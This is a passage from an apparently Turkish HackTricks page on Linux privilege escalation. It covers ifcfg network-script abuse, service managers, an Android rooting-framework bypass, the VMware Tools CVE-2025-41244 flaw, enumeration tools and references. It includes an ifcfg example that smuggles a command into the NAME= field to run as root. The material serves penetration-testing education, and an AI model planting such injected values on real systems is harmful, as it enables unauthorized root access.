Daha düşük ayrıcalıklı bir kullanıcı bir `ifcfg-*` dosyasını oluşturabiliyor veya değiştirebiliyorsa **ve** ayrıcalıklı bir ağ etkinleştirme yolu tam olarak bu dosyayı okuyacaksa, dosya incelenmeye değer bir ipucudur. Etkin dosya ve dizin izinlerini, seçilen arayüzü, kurulu `ifup`/`ifdown` uygulamasını ve bunları kimin çağırdığını doğrulayın. Tek başına yazılabilir bir dosya komut yürütülmesine yol açmaz. [Red Hat'in RHEL 7 ağ kılavuzu](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/networking_guide/sec-using_networkmanager_with_sysconfig_files), eski ağ betiklerini NetworkManager'dan ayırır: NetworkManager eski betikleri kendi başına tetiklemez. [RHEL 8 belgelerinde](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/assembly_legacy-network-scripts-support-in-rhel_configuring-and-managing-networking), varsayılan `ifup`/`ifdown` uygulamalarının NetworkManager'ı kullandığı; isteğe bağlı eski paketinin ise shell betikleri sağladığı belirtilir.

Gerçekten ayrıcalıklı eski betikler kullanan bir sistemde, tırnak içine alınmamış ve shell tarafından kaynak olarak yüklenen `NAME=` gibi bir `ifcfg-*` ataması, kod yürütme sınırını aşabilir. Tam ayrıştırıcıyı, değeri ve etkinleştirme yolunu doğrulayın; dosya adına veya NetworkManager'ın varlığına bakarak shell yorumlaması yapıldığını varsaymayın. Çağıranın girdisini bir `ifcfg-*` dosyasına yazan ve ardından eski `ifup` uygulamasını çağıran, sudo ile çalıştırılmasına izin verilmiş bir sarmalayıcı; çağıran dosyayı doğrudan düzenleyemese bile bu sınıra ulaşmanın ayrı bir yoludur.

Örneğin: _/etc/sysconfig/network-scripts/ifcfg-1337_

```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```

(_Network ile /bin/id arasındaki boşluğa dikkat edin_)

### **init, init.d, systemd ve rc.d**

`/etc/init.d` dizini, **klasik Linux hizmet yönetimi sistemi** olan System V init (SysVinit) için **script'leri** barındırır. Hizmetleri `start`, `stop`, `restart` ve bazen `reload` etmek için kullanılan script'leri içerir. Bunlar doğrudan veya `/etc/rc?.d/` içinde bulunan sembolik bağlantılar aracılığıyla çalıştırılabilir. Redhat sistemlerinde alternatif yol `/etc/rc.d/init.d` şeklindedir.

Öte yandan `/etc/init`, Ubuntu tarafından sunulan daha yeni bir **hizmet yönetimi** sistemi olan **Upstart** ile ilişkilidir ve hizmet yönetimi görevleri için yapılandırma dosyaları kullanır. Upstart'a geçişe rağmen, Upstart'taki uyumluluk katmanı sayesinde SysVinit script'leri Upstart yapılandırmalarıyla birlikte kullanılmaya devam eder.

**systemd**, isteğe bağlı daemon başlatma, automount yönetimi ve sistem durumu anlık görüntüleri gibi gelişmiş özellikler sunan modern bir başlatma ve hizmet yöneticisi olarak ortaya çıkmıştır. Dosyaları dağıtım paketleri için `/usr/lib/systemd/`, yöneticilerin yaptığı değişiklikler içinse `/etc/systemd/system/` altında düzenleyerek sistem yönetimini kolaylaştırır.<sup>[[21]](#references)</sup>

## Diğer Teknikler

### NFS Privilege escalation


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Kısıtlı Shell'lerden kaçış


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Android rooting framework'leri: manager-channel kötüye kullanımı

Android rooting framework'leri, ayrıcalıklı kernel işlevlerini userspace manager'a açmak için genellikle bir syscall'u hook'lar. Zayıf manager kimlik doğrulaması (ör. FD sırasına dayalı imza kontrolleri veya zayıf parola yöntemleri), yerel bir uygulamanın manager'ı taklit etmesine ve zaten root edilmiş cihazlarda root yetkisi elde etmesine olanak tanıyabilir. Daha fazla bilgi ve exploitation ayrıntılarını burada bulabilirsiniz:


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Regex tabanlı exec ile VMware Tools hizmet keşfi LPE (CWE-426) (CVE-2025-41244)

VMware Tools/Aria Operations'taki regex tabanlı hizmet keşfi, süreç komut satırlarından bir binary path'i çıkarıp bunu ayrıcalıklı bir bağlamda -v ile çalıştırabilir. İzin verici kalıplar (ör. \S kullanımı), yazılabilir konumlarda (ör. /tmp/httpd) saldırgan tarafından yerleştirilmiş dinleyicilerle eşleşebilir ve root olarak kod çalıştırılmasına yol açabilir (CWE-426 Güvenilmeyen Arama Yolu).<sup>[[27]](#references)</sup>

Diğer keşif/izleme yığınlarına uygulanabilecek genelleştirilmiş bir kalıbı öğrenmek ve görmek için:


{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Güvenlik Korumaları

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Daha fazla yardım

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Araçları

### **Linux local privilege escalation vektörlerini bulmak için en iyi araç:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t seçeneği)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Linux ve MAC'teki kernel açıklarını listeleyin [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (fiziksel erişim):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Daha fazla script derlemesi**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [1] [0xdf – HTB Planning (Crontab UI privesc, zip -P kimlik bilgilerini yeniden kullanma)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era: cron tarafından çalıştırılan monitor için sahte .text_sig payload'u](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch atlatması (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [Temel Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Linux Privilege Escalation Rehberi](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [Saldır ve Savun: 2016'nın Linux Privilege Escalation Teknikleri](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [8] [Kimse komut çalıştırılmasını beklemiyordu!](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [9] [Sudo (LD_PRELOAD) (Linux Privilege Escalation)](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – Laboratuvar Alıştırmaları Çözüm Rehberi - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [11] [frizb/Linux-Privilege-Escalation: Linux Privilege Escalation için ipuçları ve püf noktaları](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [13] [rtcrowley/linux-private-i: Linux Enumeration ve Privilege Escalation aracı](https://github.com/rtcrowley/linux-private-i)
- [14] [Socket nedir?](https://www.linux.com/news/what-socket/)
- [15] [Peppo (Proving Grounds) writeup](https://muzec0318.github.io/posts/PG/peppo.html)
- [16] [D-BUS'u keşfedin](https://www.linuxjournal.com/article/7744)
- [17] [SUID Executables Linux Privilege Escalation](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [18] [Sudo Bölüm 2 – Linux Privilege Escalation](https://juggernaut-sec.com/sudo-part-2-lpe)
- [19] [Linux'ta ACL'ler nasıl yönetilir](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [20] [network-scripts üzerinden Redhat/CentOS root erişimi](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [21] [systemd nedir?](https://www.linode.com/docs/guides/what-is-systemd/)
- [22] [0xdf – HTB Eureka (log'lar üzerinden bash arithmetic injection, genel saldırı zinciri)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [23] [GNU Bash Manual – BASH_ENV (etkileşimsiz başlangıç dosyası)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [24] [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [25] [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik (pg_basebackup cron kopyalama → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – Adını siz koyun, VMware yetki yükseltiyor (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [28] [Stratascale – CVE-2025-32463: Sudo Chroot ile ayrıcalık yükseltme](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
- [29] [Rich Mirch – CVE-2025-32462 ve CVE-2025-32463 Sudo ayrıcalık yükseltme açıkları](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
- [30] [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [31] [PEP 3147 – PYC Depo Dizinleri](https://peps.python.org/pep-3147/)
- [32] [Python importlib belgeleri](https://docs.python.org/3/library/importlib.html)
- [33] [polkit/polkit sorunu #74](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
- [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
- [35] [@paragonsec tarafından atılan Tweet](https://twitter.com/paragonsec/status/1071152249529884674)
- [36] [redsiege.com - Linux'ta parolaları log'lama](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
- [37] [tech.feedyourhead.at - Logrotate yarış durumunun ayrıntıları](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
{{#include ../../../banners/hacktricks-training.md}}
